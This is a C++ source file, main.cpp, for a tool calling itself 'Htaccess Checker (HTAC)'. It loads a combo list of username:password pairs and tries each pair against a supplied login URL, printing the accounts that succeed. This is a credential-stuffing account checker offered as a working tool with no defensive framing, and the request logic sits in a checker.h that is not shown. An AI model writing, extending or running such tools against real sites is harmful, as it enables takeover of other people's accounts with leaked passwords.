#include "account.h"
#include "checker.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <list>

int main(int argc, char** argv) {
  printf("Welcome into Htaccess Checker (HTAC)\n");

  if (argc != 3) {
    printf("Usage: htac <login url> <combo list file path>\n");
    printf("Combo List format: <username>:<password>\n");

    // Exit program
    return EXIT_FAILURE;
  }

  /////////// READ COMBO LIST

  // Account list
  std::list<Account*> accounts;

  FILE* fp = fopen(argv[2], "r");
  char* line = NULL;
  const char* delimiter = ":";
  size_t len = 0;
  ssize_t read;

  if (fp == NULL) return EXIT_FAILURE;
  while ((read = getline(&line, &len, fp)) != -1) {
    // Remove EOL char
    line[read - 1] = '\0';
    --read;

    // Parse line
    char* username;
    char* password;
    username = strtok(line, delimiter);
    password = strtok(NULL, delimiter);

    // Account creation
    Account* account = new Account(username, password);
    accounts.push_back(account);
  }

  // Close file and free line buffer
  fclose(fp);
  free(line);

  /////////// ACCOUNT CHECKER

  // Initialize account checker
  Checker* checker = new Checker(argv[1]);
  size_t validCount = 0;

  // Check accounts
  for (Account* account : accounts) {
    bool valid = checker->checkAccount(account);
    account->setValid(valid);
    if (account->isValid()) {
      account->print();
      ++validCount;
    }
  }

  printf("Found %i valid accounts\n", validCount);

  /////////// Free memory
  delete checker;
  for (Account* account : accounts) {
    delete account;
  }

  // Exit program
  return EXIT_SUCCESS;
}